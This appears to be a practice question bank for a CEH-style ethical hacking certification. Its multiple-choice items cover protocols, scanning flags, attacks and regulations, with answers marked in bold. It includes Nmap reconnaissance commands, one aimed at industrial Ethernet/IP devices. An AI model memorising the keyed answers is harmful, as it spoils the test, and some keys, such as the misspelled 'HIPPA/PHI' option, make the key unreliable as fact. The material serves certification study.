Bella, a security professional working at an IT firm, finds that a security breach has occurred while transferring important files. Sensitive data, employee usernames, and passwords are shared in plaintext, paving the way for hackers to perform successful session hijacking. To address this situation, Bella implemented a protocol that sends data using encryption and digital certificates.
Which of the following protocols is used by Bella?

- **A. FTPS**
- B. FTP
- C. HTTPS
- D. IP

---

John wants to send Marie an email that includes sensitive information, and he does not trust the network that he is connected to. Marie gives him the idea of using PGP. What should John do to communicate correctly using this type of encryption?

- A. Use his own private key to encrypt the message.
- B. Use his own public key to encrypt the message.
- C. Use Marie’s private key to encrypt the message.
- **D. Use Marie’s public key to encrypt the message.**

---

In the Common Vulnerability Scoring System (CVSS) v3.1 severity ratings, what range does medium vulnerability fall in?

- A. 4.0-6.0
- B. 3.9-6.9
- C. 3.0-6.9
- **D. 4.0-6.9**

---

Bill is a network administrator. He wants to eliminate unencrypted traffic inside his company’s network. He decides to setup a SPAN port and capture all traffic to the datacenter. He immediately discovers unencrypted traffic in port UDP 161. What protocol is this port using and how can he secure that traffic?

- A. RPC and the best practice is to disable RPC completely.
- **B. SNMP and he should change it to SNMP V3.**
- C. SNMP and he should change it to SNMP V2, which is encrypted.
- D. It is not necessary to perform any actions, as SNMP is not carrying important information.

---

Consider the following Nmap output:

![image3](https://img.examtopics.com/312-50v13/image3.png)

What command-line parameter could you use to determine the type and version number of the web server?

- **A. -sV**
- B. -sS
- C. -Pn
- D. -V

---

Bob was recently hired by a medical company after it experienced a major cyber security breach. Many patients are complaining that their personal medical records are fully exposed on the Internet and someone can find them with a simple Google search. Bob’s boss is very worried because of regulations that protect those data.
Which of the following regulations is mostly violated?

- A. PCI DSS
- B. PII
- C. ISO 2002
- **D. HIPPA/PHI**

---

Infecting a system with malware and using phishing to gain credentials to a system or web application are examples of which phase of the ethical hacking methodology?

- A. Scanning
- **B. Gaining access**
- C. Maintaining access
- D. Reconnaissance

---

Larry, a security professional in an organization, has noticed some abnormalities in the user accounts on a web server. To thwart evolving attacks, he decided to harden the security of the web server by adopting a few countermeasures to secure the accounts on the web server.
Which of the following countermeasures must Larry implement to secure the user accounts on the web server?

- A. Retain all unused modules and application extensions.
- **B. Limit the administrator or root-level access to the minimum number of users.**
- C. Enable all non-interactive accounts that should exist but do not require interactive login.
- D. Enable unused default user accounts created during the installation of an OS.

*Thwart: empêcher*

---

There are multiple cloud deployment options depending on how isolated a customer’s resources are from those of other customers. Shared environments share the costs and allow each customer to enjoy lower operations expenses. One solution is for a customer to join with a group of users or organizations to share a cloud environment.
What is this cloud deployment option called?

- A. Private
- **B. Community**
- C. Public
- D. Hybrid

---

Allen, a professional pen tester, was hired by XpertTech Solutions to perform an attack simulation on the organization’s network resources. To perform the attack, he took advantage of the NetBIOS API and targeted the NetBIOS service. By enumerating NetBIOS, he found that port 139 was open and could see the resources that could be accessed or viewed on a remote system. He came across many NetBIOS codes during enumeration.
Identify the NetBIOS code used for obtaining the messenger service running for the logged-in user?

- A. <00>
- B. <20>
- **C. <03>**
- D. <1B>

---

Don, a student, came across a gaming app in a third-party app store and installed it. Subsequently, all the legitimate apps in his smartphone were replaced by deceptive applications that appeared legitimate. He also received many advertisements on his smartphone after installing the app.
What is the attack performed on Don in the above scenario?

- A. SIM card attack
- B. Clickjacking
- C. SMS phishing attack
- **D. Agent Smith attack**

---

Samuel, a security administrator, is assessing the configuration of a web server. He noticed that the server permits SSLv2 connections, and the same private key certificate is used on a different server that allows SSLv2 connections. This vulnerability makes the web server vulnerable to attacks as the SSLv2 server can leak key information.
Which of the following attacks can be performed by exploiting the above vulnerability?

- A. Padding oracle attack
- **B. DROWN attack**
- C. DUHK attack
- D. Side-channel attack

---

Clark, a professional hacker, was hired by an organization to gather sensitive information about its competitors surreptitiously. Clark gathers the server IP address of the target organization using Whois footprinting. Further, he entered the server IP address as an input to an online tool to retrieve information such as the network range of the target organization and to identify the network topology and operating system used in the network.
What is the online tool employed by Clark in the above scenario?

- A. DuckDuckGo
- B. AOL
- **C. ARIN**
- D. Baidu

---

You are a penetration tester and are about to perform a scan on a specific server. The agreement that you signed with the client contains the following specific condition for the scan: “The attacker must scan every port on the server several times using a set of spoofed source IP addresses.” Suppose that you are using Nmap to perform this scan.
What flag will you use to satisfy this requirement?

- A. The -g flag
- B. The -A flag
- C. The -f flag
- **D. The -D flag**

---

Jude, a pen tester, examined a network from a hacker’s perspective to identify exploits and vulnerabilities accessible to the outside world by using devices such as firewalls, routers, and servers. In this process, he also estimated the threat of network security attacks and determined the level of security of the corporate network. What is the type of vulnerability assessment that Jude performed on the organization?

- A. Application assessment
- **B. External assessment**
- C. Passive assessment
- D. Host-based assessment

---

Widespread fraud at Enron, WorldCom, and Tyco led to the creation of a law that was designed to improve the accuracy and accountability of corporate disclosures. It covers accounting firms and third parties that provide financial services to some organizations and came into effect in 2002. This law is known by what acronym?

- **A. SOX**
- B. FedRAMP
- C. HIPAA
- D. PCI DSS

---

Abel, a security professional, conducts penetration testing in his client organization to check for any security loopholes. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. This led to a DoS attack, and as a result, legitimate employees were unable to access the client’s network.
Which of the following attacks did Abel perform in the above scenario?

- A. Rogue DHCP server attack
- B. VLAN hopping
- C. STP attack
- **D. DHCP starvation**

----

This form of encryption algorithm is a symmetric key block cipher that is characterized by a 128-bit block size, and its key size can be up to 256 bits. Which among the following is this encryption algorithm?

- A. HMAC encryption algorithm
- **B. Twofish encryption algorithm**
- C. IDEA
- D. Blowfish encryption algorithm

---

Jude, a pen tester working in Keiltech Ltd., performs sophisticated security testing on his company's network infrastructure to identify security loopholes. In this process, he started to circumvent the network protection tools and firewalls used in the company. He employed a technique that can create forged TCP sessions by carrying out multiple SYN, ACK, and RST or FIN packets. Further, this process allowed Jude to execute DDoS attacks that can exhaust the network resources.
What is the attack technique used by Jude for finding loopholes in the above scenario?

- **A. Spoofed session flood attack**
- B. UDP flood attack
- C. Peer-to-peer attack
- D. Ping-of-death attack

---

Jim, a professional hacker, targeted an organization that is operating critical industrial infrastructure. Jim used Nmap to scan open ports and running services on systems connected to the organization’s OT network. He used an Nmap command to identify Ethernet/IP devices connected to the Internet and further gathered information such as the vendor name, product code and name, device name, and IP address. Which of the following Nmap commands helped Jim retrieve the required information?

- A. nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >
- **B. nmap -Pn -sU -p 44818 --script enip-info < Target IP >**
- C. nmap -Pn -sT -p 46824 < Target IP >
- D. nmap -Pn -sT -p 102 --script s7-info < Target IP >

---

While testing a web application in development, you notice that the web server does not properly ignore the “dot dot slash” (../) character string and instead returns the file listing of a folder higher up in the folder structure of the server.
What kind of attack is possible in this scenario?

- A. Cross-site scripting
- B. SQL injection
- C. Denial of service
- **D. Directory traversal**

---

Richard, an attacker, aimed to hack IoT devices connected to a target network. In this process, Richard recorded the frequency required to share information between connected devices. After obtaining the frequency, he captured the original data when commands were initiated by the connected devices. Once the original data were collected, he used free tools such as URH to segregate the command sequence. Subsequently, he started injecting the segregated command sequence on the same frequency into the IoT network, which repeats the captured signals of the devices.
What is the type of attack performed by Richard in the above scenario?

- A. Cryptanalysis attack
- B. Reconnaissance attack
- C. Side-channel attack
- **D. Replay attack**

---

Which of the following allows attackers to draw a map or outline the target organization's network infrastructure to know about the actual environment that they are going to hack?

- A. Vulnerability analysis
- B. Malware analysis
- **C. Scanning networks**
- D. Enumeration

---

Your company was hired by a small healthcare provider to perform a technical assessment on the network. What is the best approach for discovering vulnerabilities on a Windows-based computer?

- A. Use the built-in Windows Update tool
- **B. Use a scan tool like Nessus**
- C. Check MITRE.org for the latest list of CVE findings
- D. Create a disk image of a clean Windows installation

---

Susan, a software developer, wants her web API to update other applications with the latest information. For this purpose, she uses a user-defined HTTP callback or push APIs that are raised based on trigger events; when invoked, this feature supplies data to other applications so that users can instantly receive real-time information.
Which of the following techniques is employed by Susan?

- A. Web shells
- **B. Webhooks**
- C. REST API
- D. SOAP API

---

Which IOS jailbreaking technique patches the kernel during the device boot so that it becomes jailbroken after each successive reboot?

- A. Tethered jailbreaking
- B. Semi-untethered jailbreaking
- C. Semi-tethered jailbreaking
- **D. Untethered jailbreaking**

---

Stella, a professional hacker, performs an attack on web services by exploiting a vulnerability that provides additional routing information in the SOAP header to support asynchronous communication. This further allows the transmission of web-service requests and response messages using different TCP connections.
Which of the following attack techniques is used by Stella to compromise the web services?

- A. Web services parsing attacks
- **B. WS-Address spoofing**
- C. SOAPAction spoofing
- D. XML injection

---

Attacker Steve targeted an organization’s network with the aim of redirecting the company’s web traffic to another malicious website. To achieve this goal, Steve performed DNS cache poisoning by exploiting the vulnerabilities in the DNS server software and modified the original IP address of the target website to that of a fake website.
What is the technique employed by Steve to gather information for identity theft?

- **A. Pharming**
- B. Skimming
- C. Pretexting
- D. Wardriving

---

What is the port to block first in case you are suspicious that an IoT device has been compromised?

- A. 22
- **B. 48101**
- C. 80
- D. 443

---

Clark is a professional hacker. He created and configured multiple domains pointing to the same host to switch quickly between the domains and avoid detection. Identify the behavior of the adversary in the above scenario.

- **A. Unspecified proxy activities**
- B. Use of command-line interface
- C. Data staging
- D. Use of DNS tunneling

---

What firewall evasion scanning technique make use of a zombie system that has low network activity as well as its fragment identification numbers?

- A. Packet fragmentation scanning
- B. Spoof source address scanning
- C. Decoy scanning
- **D. Idle scanning**

---

